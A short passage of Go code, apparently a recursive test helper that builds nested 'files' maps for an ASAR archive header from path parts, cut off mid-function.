		root[parts[0]] = map[string]any{"files": child}
	} else if nested, ok := child["files"].(map[string]any); ok {
		child = nested
	}
	addAsarTestHeader(child, parts[1:], file)
}
